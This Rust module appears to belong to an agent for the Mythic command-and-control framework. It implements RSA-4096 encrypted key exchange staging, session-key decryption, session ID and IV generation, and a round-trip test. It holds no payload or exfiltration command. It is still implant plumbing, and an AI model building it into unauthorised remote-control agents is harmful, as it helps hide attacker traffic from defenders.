//! Additional crypto primitives — currently RSA EKE staging.
//!
//! The RSA staging flow ("staging_rsa") is used when the C2 profile requests an
//! encrypted key exchange. It is gated behind the `rsa-staging` Cargo feature.

use rsa::{Oaep, RsaPrivateKey, pkcs1::EncodeRsaPublicKey};
use sha1::Sha1;

use crate::MythicError;
use crate::protocol::codec::{AES256_IV_LEN, AES256_KEY_LEN, Aes256HmacCrypto};

/// RSA-4096 keypair used for Mythic's encrypted key exchange (EKE).
///
/// Mythic expects:
/// - 4096-bit RSA keypair
/// - PKCS#1 OAEP padding with SHA-1
/// - `pub_key` sent as base64-encoded PEM in the `staging_rsa` request
/// - `session_key` returned by Mythic is the new AES-256 key, encrypted with
///   the agent's public key and base64-encoded.
pub struct RsaEke {
    priv_key: RsaPrivateKey,
}

impl RsaEke {
    /// Generate a new 4096-bit RSA keypair.
    pub fn generate() -> Result<Self, MythicError> {
        let mut rng = rand::thread_rng();
        let priv_key = RsaPrivateKey::new(&mut rng, 4096).map_err(|_| MythicError::RsaKeyGen)?;
        Ok(Self { priv_key })
    }

    /// Return the public key as a base64-encoded PEM string (including
    /// BEGIN/END lines). This matches Mythic's "base64 of public RSA key"
    /// option.
    pub fn public_key_b64(&self) -> Result<String, MythicError> {
        let pem = self
            .priv_key
            .to_public_key()
            .to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)
            .map_err(|_| MythicError::RsaKeyGen)?;
        Ok(crate::protocol::codec::base64_encode_urlsafe(
            pem.as_bytes(),
        ))
    }

    /// Decrypt the `session_key` returned by Mythic using the private key.
    /// The returned bytes are the raw 32-byte AES-256 session key.
    pub fn decrypt_session_key(
        &self,
        session_key_b64: &str,
    ) -> Result<[u8; AES256_KEY_LEN], MythicError> {
        let enc = crate::protocol::codec::base64_decode_permissive(session_key_b64)?;
        let padding = Oaep::new::<Sha1>();
        let key = self
            .priv_key
            .decrypt(padding, &enc)
            .map_err(|_| MythicError::RsaDecrypt)?;
        if key.len() != AES256_KEY_LEN {
            return Err(MythicError::RsaDecrypt);
        }
        let mut out = [0u8; AES256_KEY_LEN];
        out.copy_from_slice(&key);
        Ok(out)
    }

    /// Build an `Aes256HmacCrypto` from the decrypted session key.
    pub fn session_crypto(&self, session_key_b64: &str) -> Result<Aes256HmacCrypto, MythicError> {
        let key = self.decrypt_session_key(session_key_b64)?;
        Ok(Aes256HmacCrypto::new(key))
    }
}

/// Generate a 20-character session id for RSA staging.
pub fn generate_session_id() -> String {
    use rand::Rng;
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::thread_rng();
    (0..20)
        .map(|_| CHARSET[rng.gen_range(0..CHARSET.len())] as char)
        .collect()
}

/// Generate a random 16-byte IV for AES-CBC.
pub fn random_iv() -> Result<[u8; AES256_IV_LEN], MythicError> {
    let mut iv = [0u8; AES256_IV_LEN];
    getrandom::getrandom(&mut iv).map_err(|_| MythicError::Crypto)?;
    Ok(iv)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rsa_key_gen_and_oaep_roundtrip() {
        let rsa = RsaEke::generate().unwrap();
        let pub_key_b64 = rsa.public_key_b64().unwrap();
        assert!(!pub_key_b64.is_empty());

        // Encrypt a fake session key with the public key, then decrypt.
        let session_key = [0xAB; AES256_KEY_LEN];
        let pub_key = rsa.priv_key.to_public_key();
        let mut rng = rand::thread_rng();
        let padding = Oaep::new::<Sha1>();
        let enc = pub_key.encrypt(&mut rng, padding, &session_key).unwrap();
        let enc_b64 = crate::protocol::codec::base64_encode_urlsafe(&enc);

        let decrypted = rsa.decrypt_session_key(&enc_b64).unwrap();
        assert_eq!(decrypted, session_key);
    }
}
